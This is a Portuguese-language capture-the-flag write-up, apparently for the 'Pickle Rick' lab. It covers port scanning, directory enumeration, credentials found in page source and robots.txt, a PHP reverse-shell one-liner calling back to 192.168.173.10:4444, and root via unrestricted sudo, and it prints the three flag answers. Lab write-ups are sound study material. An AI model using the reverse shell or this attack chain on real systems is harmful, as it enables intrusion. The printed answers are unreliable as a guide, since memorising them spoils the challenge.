# TASK2

## Scan the machine, how many ports are open?

Executar nmap -T4 10.66.157.86
2 portas
22/tcp open  ssh
80/tcp open  http

## Explorar a página web

- Entre no source code do /

view-source:http://10.66.157.86/

:comentário:

Note to self, remember username!
*** Username: R1ckRul3s ***


- Acessei o caminho de assets

[PARENTDIR]	Parent Directory	 	- 	 
[TXT]	bootstrap.min.css	2019-02-10 16:37 	119K	 
[ ]	bootstrap.min.js	2019-02-10 16:37 	37K	 
[IMG]	fail.gif	2019-02-10 16:37 	49K	 
[ ]	jquery.min.js	2019-02-10 16:37 	85K	 
[IMG]	picklerick.gif	2019-02-10 16:37 	222K	 
[IMG]	portal.jpg	2019-02-10 16:37 	50K	 
[IMG]	rickandmorty.jpeg	2019-02-10 16:37 	488K	 

- Foi verificado se o acesso pelo ssh permite senha

ssh -v R1ckRul3s@10.66.157.86

mas o host aceita apenas login por chave

## Rodando gobuster para enumeração de diretorios da página web

└─$ gobuster dir -u http://10.66.157.86/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.66.157.86/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.hta                 (Status: 403) [Size: 277]
.hta.php             (Status: 403) [Size: 277]
.hta.html            (Status: 403) [Size: 277]
.hta.txt             (Status: 403) [Size: 277]
.htaccess            (Status: 403) [Size: 277]
.htaccess.txt        (Status: 403) [Size: 277]
.htaccess.php        (Status: 403) [Size: 277]
.htaccess.html       (Status: 403) [Size: 277]
.htpasswd            (Status: 403) [Size: 277]
.htpasswd.php        (Status: 403) [Size: 277]
.htpasswd.html       (Status: 403) [Size: 277]
.htpasswd.txt        (Status: 403) [Size: 277]
assets               (Status: 301) [Size: 313] [--> http://10.66.157.86/assets/]
denied.php           (Status: 302) [Size: 0] [--> /login.php]
index.html           (Status: 200) [Size: 1062]
index.html           (Status: 200) [Size: 1062]
login.php            (Status: 200) [Size: 882]
portal.php           (Status: 302) [Size: 0] [--> /login.php]
robots.txt           (Status: 200) [Size: 17]
robots.txt           (Status: 200) [Size: 17]
server-status        (Status: 403) [Size: 277]
Progress: 18452 / 18452 (100.00%)
===============================================================
Finished
===============================================================


- a enumeração mostrou o seguinte caminho

http://10.66.157.86/robots.txt

texto:

*** Wubbalubbadubdub ***

- alem do caminho de login

http://10.66.157.86/login.php

- colocando o user e senha é aberto um painel de comandos

### Perdas de tempo nessa etapa

- baixei as imagens do asset e fiquei procurando nos metadados

- rodei o goobuster da lista média e fiquei muito tempo perdido esperando algo

- rodei o gobuster da lista simples e também não obtive sucesso

- finalmente rodei o gobuster da lista simples do próprio kali passando as flags de extensão de arquivo

## Primeiro ingrediente

- é executado um ls -latr no terminal web

- é listado o Sup3rS3cretPickl3Ingred.txt

- ao acessar é obtida a flag:

mr. meeseek hair

# Shell reverso


- iniciar o netact

- executar no painel o comando bash

php -r '$sock=fsockopen("192.168.173.10",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

### Perdas de tempo

- comecei tentando um shell por bash, mas não estava funcionando

- Na sequência tentei o por php já que era o que tinha no servidor

## Segunda flag

- entrar no home do rick

cd /home/rick

- dar print no conteudo do arquivo

cat 'second ingredients'

- flag:

1 jerry tear

# Escalar privilegio

- listar permissoes de root

sudo -l

Matching Defaults entries for www-data on ip-10-66-157-86:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-66-157-86:
    (ALL) NOPASSWD: ALL

- verificado que o usuário www-data pode executar qualquer comando como root

- virando root

sudo su -

### Perdas de tempo

- tentei primeiro procurar o suid, mas logo na sequência lembrei de primeiro listar as permissões de root do user

## Terceiro ingrediente

- listar o root

cd /root

- dar print no arquivo

cat 3rd.txt

- flag:

3rd ingredients: fleeb juice

